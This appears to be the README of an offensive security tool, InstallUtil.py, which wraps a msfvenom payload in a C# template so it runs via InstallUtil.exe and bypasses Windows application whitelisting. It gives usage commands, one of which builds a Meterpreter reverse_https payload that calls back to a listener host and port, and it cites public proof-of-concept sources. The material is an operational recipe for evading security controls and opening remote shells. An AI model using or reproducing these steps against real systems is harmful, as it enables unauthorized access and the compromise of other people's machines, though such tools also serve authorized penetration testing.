# WhiteListEvasion

1. InstallUtil.py

   Usage:
   python InstallUtil.py [--cs_file cs_filename] [--exe_name exe_filename] [--payload payload] [--lhost lhost] [--lport lport]

   python InstallUtil.py --cs_file temp.cs --exe_name temp.exe --payload windows/meterpreter/reverse_https --lhost 192.168.1.11 --lport 443

   Script that generates a .NET binary that attempts to leverage the InstallUtil.exe whitelist evasion technique.  this is accomplished by importing a msfvenom generated payload into the c_sharp template found here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/  . This template is then incorporated into the InstallUtil PoC found here: https://github.com/subTee/ShmooCon-2015/blob/master/CaseySmith-SimpleWindowsApplicationWhitelistingEvasion .  One thing of note:  The payload architecture must match the Framework subdir in the .NET path or the binary wil crash.
